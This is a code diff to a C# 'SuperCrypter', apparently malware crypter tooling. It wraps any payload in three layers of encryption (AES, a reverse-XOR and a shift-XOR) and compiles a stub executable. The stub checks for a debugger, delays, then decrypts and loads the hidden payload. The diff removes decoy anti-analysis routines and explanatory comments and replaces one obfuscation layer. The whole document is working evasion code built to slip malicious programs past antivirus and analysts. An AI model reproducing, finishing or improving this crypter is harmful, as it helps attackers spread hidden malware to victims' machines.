@@ -13,12 +13,8 @@ using Microsoft.CSharp;
 
 public class SuperCrypter
 {
-    // A selection of encryption and obfuscation methods ported from GClass0.cs
     #region EncryptionMethods
 
-    /// <summary>
-    /// AES encryption. A strong, standard symmetric encryption algorithm.
-    /// </summary>
     public static byte[] AESEncrypt(byte[] data, string password)
     {
         using (var aes = new AesManaged())
@@ -36,7 +32,7 @@ public class SuperCrypter
             using (var encryptor = aes.CreateEncryptor(aes.Key, aes.IV))
             using (var ms = new MemoryStream())
             {
-                ms.Write(iv, 0, iv.Length); // Prepend IV
+                ms.Write(iv, 0, iv.Length);
                 using (var cs = new CryptoStream(ms, encryptor, CryptoStreamMode.Write))
                 {
                     cs.Write(data, 0, data.Length);
@@ -47,25 +43,19 @@ public class SuperCrypter
         }
     }
 
-    /// <summary>
-    /// A custom polymorphic reverse-and-XOR encryption algorithm.
-    /// </summary>
     public static byte[] PolyRevEncrypt(byte[] data, string key)
     {
         byte randomByte = (byte)new Random().Next(1, 255);
         byte[] keyBytes = Encoding.ASCII.GetBytes(key);
         byte[] encryptedData = new byte[data.Length + 1];
 
-        Array.Reverse(keyBytes); // Part of the polymorphic nature
+        Array.Reverse(keyBytes);
         int keyIndex = 0;
 
         for (int i = 0; i < data.Length; i++)
         {
             encryptedData[i] = (byte)((data[i] ^ keyBytes[keyIndex]) ^ randomByte);
-            if (++keyIndex >= keyBytes.Length)
-            {
-                keyIndex = 0;
-            }
+            if (++keyIndex >= keyBytes.Length) keyIndex = 0;
         }
 
         encryptedData[data.Length] = randomByte;
@@ -73,31 +63,19 @@ public class SuperCrypter
         return encryptedData;
     }
 
-    /// <summary>
-    /// A complex, byte-shifting XOR algorithm for an extra layer of obfuscation.
-    /// </summary>
-    public static byte[] DexEncrypt(byte[] data, string key)
+    // This is a self-inverting XOR encryption. The same function is used for decryption.
+    public static byte[] ShiftXorEncrypt(byte[] data, string key, int shift)
     {
-        byte[] keyBytes = System.Text.Encoding.ASCII.GetBytes(key);
-        for (int i = 0; i < 5; i++) // Multiple passes to increase complexity
+        byte[] keyBytes = Encoding.ASCII.GetBytes(key);
+        for (int i = 0; i < data.Length; i++)
         {
-            for (int j = 0; j < data.Length; j++)
-            {
-                data[j] ^= keyBytes[j % keyBytes.Length];
-                for (int k = 0; k < keyBytes.Length; k++)
-                {
-                    data[j] = (byte)((int)data[j] ^ ((int)((int)keyBytes[k] << (i & 31)) ^ k) + j);
-                }
-            }
+            data[i] = (byte)(data[i] ^ ((byte)((keyBytes[i % keyBytes.Length] >> ((i + shift) % 8)) & 0xff)));
         }
         return data;
     }
 
     #endregion
 
-    /// <summary>
-    /// Generates a random alphanumeric string of a given length.
-    /// </summary>
     private static string GenerateRandomString(int length)
     {
         const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
@@ -106,9 +84,6 @@ public class SuperCrypter
           .Select(s => s[random.Next(s.Length)]).ToArray());
     }
 
-    /// <summary>
-    /// The C# source code for the executable stub.
-    /// </summary>
     private static string GetStubSource()
     {
         return @"
@@ -176,32 +151,14 @@ class Stub
         } return decryptedData;
     }
 
-    public static byte[] DexDecrypt(byte[] data, string key)
+    public static byte[] ShiftXorDecrypt(byte[] data, string key, int shift)
     {
-        byte[] keyBytes = System.Text.Encoding.ASCII.GetBytes(key);
-        for (int i = 0; i < 5; i++) {
-            for (int j = 0; j < data.Length; j++) {
-                data[j] ^= keyBytes[j % keyBytes.Length];
-                for (int k = 0; k < keyBytes.Length; k++) {
-                    data[j] = (byte)((int)data[j] ^ ((int)((int)keyBytes[k] << (i & 31)) ^ k) + j);
-                }
-            }
-        } return data;
-    }
-
-    // Decoy decryption routine. It looks plausible but does nothing.
-    public static byte[] RC4Decrypt_Decoy(byte[] data, string key)
-    {
-        // This is a decoy method to confuse analysis. It doesn't actually decrypt.
-        byte[] keyBytes = Encoding.UTF8.GetBytes(key);
-        byte[] s = new byte[256];
-        for(int i = 0; i < 256; i++) s[i] = (byte)i;
-        int j = 0;
-        for (int i = 0; i < 256; i++) {
-            j = (j + s[i] + keyBytes[i % keyBytes.Length]) % 256;
-            byte temp = s[i]; s[i] = s[j]; s[j] = temp;
+        byte[] keyBytes = Encoding.ASCII.GetBytes(key);
+        for (int i = 0; i < data.Length; i++)
+        {
+            data[i] = (byte)(data[i] ^ ((byte)((keyBytes[i % keyBytes.Length] >> ((i + shift) % 8)) & 0xff)));
         }
-        return data; // Return original data
+        return data;
     }
     #endregion
 
@@ -244,22 +201,14 @@ class Stub
         CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebuggerPresent);
         if (isDebuggerPresent) return;
 
-        // Decoy calculations to waste analysis time
-        double decoy = Math.PI;
-        for(int i=0; i<1000; i++) { decoy = Math.Sqrt(decoy * 1.00001); }
-
         Thread.Sleep(2000);
 
         var assembly = Assembly.GetExecutingAssembly();
-        var stream = assembly.GetManifestResourceStream(""[RESOURCE_NAME]"");
         var reader = new ResourceManager(""[RESOURCE_NAME]"", assembly);
         byte[] payload = (byte[])reader.GetObject(""[PAYLOAD_KEY]"");
 
-        // Decoy decryption call
-        payload = RC4Decrypt_Decoy(payload, ""a-fake-key-to-mislead-analysts"");
-
         // Three layers of real decryption
-        payload = DexDecrypt(payload, ""[KEY3]"");
+        payload = ShiftXorDecrypt(payload, ""[KEY3]"", [SHIFT_KEY]);
         payload = PolyRevDecrypt(payload, ""[KEY2]"");
         payload = AESDecrypt(payload, ""[KEY1]"");
 
@@ -275,7 +224,6 @@ class Stub
 ";
     }
 
-
     public static void Main(string[] args)
     {
         if (args.Length < 3)
@@ -286,9 +234,10 @@ class Stub
 
         string payloadPath = args[0];
         string outputPath = args[1];
-        string key1 = args[2]; // AES key from user
-        string key2 = GenerateRandomString(24); // PolyRev key
-        string key3 = GenerateRandomString(32); // Dex key
+        string key1 = args[2];
+        string key2 = GenerateRandomString(24);
+        string key3 = GenerateRandomString(32);
+        int shiftKey = new Random().Next(1, 7);
         string resourceName = GenerateRandomString(8);
         string payloadKey = GenerateRandomString(8);
 
@@ -309,8 +258,8 @@ class Stub
             Console.WriteLine("Encrypting with PolyRev (Layer 2)...");
             byte[] encrypted2 = PolyRevEncrypt(encrypted1, key2);
 
-            Console.WriteLine("Encrypting with Dex (Layer 3)...");
-            byte[] encrypted3 = DexEncrypt(encrypted2, key3);
+            Console.WriteLine("Encrypting with ShiftXor (Layer 3)...");
+            byte[] encrypted3 = ShiftXorEncrypt(encrypted2, key3, shiftKey);
 
             Console.WriteLine("Generating stub...");
             string stubSource = GetStubSource();
@@ -319,6 +268,7 @@ class Stub
             stubSource = stubSource.Replace("[KEY1]", key1);
             stubSource = stubSource.Replace("[KEY2]", key2);
             stubSource = stubSource.Replace("[KEY3]", key3);
+            stubSource = stubSource.Replace("[SHIFT_KEY]", shiftKey.ToString());
 
             string resourceFileName = Path.Combine(Path.GetTempPath(), resourceName + ".resources");
             using (var resourceWriter = new ResourceWriter(resourceFileName))
@@ -332,7 +282,7 @@ class Stub
             {
                 GenerateExecutable = true,
                 OutputAssembly = outputPath,
-                CompilerOptions = "/target:winexe /platform:anycpu",
+                CompilerOptions = "/target:exe /platform:anycpu",
                 EmbeddedResources = { resourceFileName }
             };
             parameters.ReferencedAssemblies.Add("System.dll");
@@ -348,17 +298,17 @@ class Stub
                 Console.WriteLine("Compilation failed:");
                 foreach (CompilerError error in results.Errors)
                 {
-                    Console.WriteLine($">> {error.ErrorText}");
+                    Console.WriteLine(">> " + error.ErrorText);
                 }
             }
             else
             {
-                Console.WriteLine($"Success! Crypter created at: {outputPath}");
+                Console.WriteLine("Success! Crypter created at: " + outputPath);
             }
         }
         catch (Exception ex)
         {
-            Console.WriteLine($"An error occurred: {ex.Message}");
+            Console.WriteLine("An error occurred: " + ex.Message);
         }
     }
 }
